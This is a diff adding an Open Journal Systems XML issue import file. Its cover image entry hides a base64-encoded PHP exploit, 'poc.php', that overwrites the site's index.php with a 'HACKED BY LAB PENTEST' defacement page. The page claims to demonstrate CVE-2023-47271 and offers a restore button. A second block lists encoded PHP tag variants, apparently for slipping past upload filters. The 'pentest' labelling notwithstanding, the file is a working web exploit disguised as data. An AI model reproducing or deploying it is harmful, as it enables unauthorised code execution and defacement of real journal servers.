@@ -1,0 +1,25 @@
+<?xml version="1.0"?>
+<issue xmlns="http://pkp.sfu.ca" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" published="0" current="0" access_status="1" url_path="" xsi:schemaLocation="http://pkp.sfu.ca native.xsd">
+  <id type="internal" advice="ignore">1001</id>
+  <issue_identification>
+    <volume>500</volume>
+    <number>2</number>
+    <year>1999</year>
+  </issue_identification>
+  <last_modified>2021-03-12</last_modified>
+  <covers>
+    <cover locale="en_US">
+      <cover_image>poc.php</cover_image>
+      <cover_image_alt_text/>
+      <embed encoding="base64">PD9waHAJHRhcmdldCA9ICcvdmFyL3d3dy9vanMvaW5kZXgucGhwJzsKJGJhY2t1cCA9ICcvdmFyL3d3dy9vanMvaW5kZXgucGhwLmJhayc7CgppZiAoIWZpbGVfZXhpc3RzKCRiYWNrdXApKSB7CiAgICBjb3B5KCR0YXJnZXQsICRiYWNrdXApOwp9CgokZGVmYWNlX3NjcmlwdCA9IDw8PCdFT0QnCjw/cGhwCiR0YXJnZXQgPSAnL3Zhci93d3cvb2pzL2luZGV4LnBocCc7CiRiYWNrdXAgPSAnL3Zhci93d3cvb2pzL2luZGV4LnBocC5iYWsnOwppZiAoaXNzZXQoJF9QT1NUWydyZWNvdmVyJ10pKSB7CiAgICBpZiAoZmlsZV9leGlzdHMoJGJhY2t1cCkpIHsKICAgICAgICBjb3B5KCRiYWNrdXAsICR0YXJnZXQpOwogICAgICAgIHVubGluaygkYmFja3VwKTsKICAgICAgICBlY2hvICI8c2NyaXB0PmFsZXJ0KCdSZWNvdmVyeSBTdWNjZXNzZnVsISBTeXN0ZW0gcmVzdG9yZWQuJyk7IHdpbmRvdy5sb2NhdGlvbi5ocmVmPScvJzs8L3NjcmlwdD4iOwogICAgICAgIGV4aXQ7CiAgICB9Cn0KPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD48dGl0bGU+U3lzdGVtIENvbXByb21pc2VkIC0gUGVudGVzdCBEZW1vPC90aXRsZT48L2hlYWQ+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMWExYTFhOyBjb2xvcjogIzAwZmYwMDsgdGV4dC1hbGlnbjogY2VudGVyOyBmb250LWZhbWlseTogbW9ub3NwYWNlOyBtYXJnaW4tdG9wOiAxNSU7Ij4KICAgIDxoMSBzdHlsZT0iZm9udC1zaXplOiAzZW07Ij5IQUNLRUQgQlkgTEFCIFBFTlRFU1Q8L2gxPgogICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMS4yZW07Ij5UaGlzIHN5c3RlbSBoYXMgYmVlbiB0YWtlbiBvdmVyIHRvIGRlbW9uc3RyYXRlIENWRS0yMDIzLTQ3MjcxLjwvcD4KICAgIDxwPlRoaXMgaXMgYSBjb250cm9sbGVkIHByb2Zlc3Npb25hbCBwZW5ldHJhdGlvbiB0ZXN0LjwvcD4KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9Im1hcmdpbi10b3A6IDQwcHg7Ij4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0icmVjb3ZlciIgc3R5bGU9InBhZGRpbmc6IDE1cHggMzBweDsgZm9udC1zaXplOiAxLjJlbTsgYmFja2dyb3VuZC1jb2xvcjogIzAwZmYwMDsgY29sb3I6ICMxYTFhMWE7IGJvcmRlcjogbm9uZTsgYm9yZGVyLXJhZGl1czogNXB4OyBjdXJzb3I6IHBvaW50ZXI7IGZvbnQtd2VpZ2h0OiBib2xkOyI+CiAgICAgICAgICAgIFJFU1RPUkUgU1lTVEVNIChSRUNPVkVSWSkKICAgICAgICA8L2J1dHRvbj4KICAgIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+CkVPRDsKCmZpbGVfcHV0X2NvbnRlbnRzKCR0YXJnZXQsICRkZWZhY2Vfc2NyaXB0KTsKZWNobyAiPGgxPlBheWxvYWQgRXhlY3V0ZWQ8L2gxPjxwPkRlZmFjZW1lbnQgYWN0aXZlLiBWaXNpdCB0aGUgaG9tZXBhZ2UuPC9wPiI7Cj8+</embed>
+    </cover>
+  </covers>
+  <php_tag_variants encoding="base64">
+    <variant name="php-lowercase">PD9waHAK</variant>
+    <variant name="php-uppercase">PD9QSFAK</variant>
+    <variant name="short-echo">PD89Cg==</variant>
+    <variant name="short-open">PD8K</variant>
+  </php_tag_variants>
+  <issue_galleys xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://pkp.sfu.ca native.xsd"/>
+  <articles xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://pkp.sfu.ca native.xsd"/>
+</issue>
